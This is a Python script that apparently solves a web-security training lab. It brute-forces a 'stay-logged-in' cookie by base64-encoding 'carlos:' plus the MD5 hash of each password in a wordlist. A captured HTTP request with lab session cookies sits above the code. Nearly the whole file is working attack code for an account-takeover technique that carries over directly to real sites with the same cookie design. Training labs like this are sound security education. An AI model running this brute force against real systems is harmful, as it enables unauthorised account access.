'''GET /my-account?id=wiener HTTP/2
Host: 0a5c00c5034a87128421132200590005.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5c00c5034a87128421132200590005.web-security-academy.net/login
Connection: keep-alive
Cookie: session=Qkmqa1mh8i2ov3mJlDoN8wBDcSrpahKa; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers
'''

import requests
import hashlib
import base64

DOMAIN = "0a5c00c5034a87128421132200590005.web-security-academy.net"
URL = f"https://{DOMAIN}/my-account"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/login",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}

COOKIES = {
    "session": "v2OQh6hDp811afq0XRVleEYETqO1HNuB",
    "stay-logged-in": "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"
}

with open("../passwords.dic", "r") as file:
    PASSWORD_DIC = file.readlines()

def brute_stay_logged_in_cookie():
    for password in PASSWORD_DIC:
        password = password.strip()
        password_hash = hashlib.md5(password.encode()).hexdigest()

        COOKIES["stay-logged-in"] = base64.b64encode(('carlos:' + password_hash).encode()).decode()
        response = requests.get(URL, headers=HEADERS, cookies=COOKIES)
        print(f"Trying password {password}")
        
        if "Your username is" in response.text:
            print(response.text)
            print(COOKIES["stay-logged-in"])
            print(f"Password found: {password}")
            break

brute_stay_logged_in_cookie()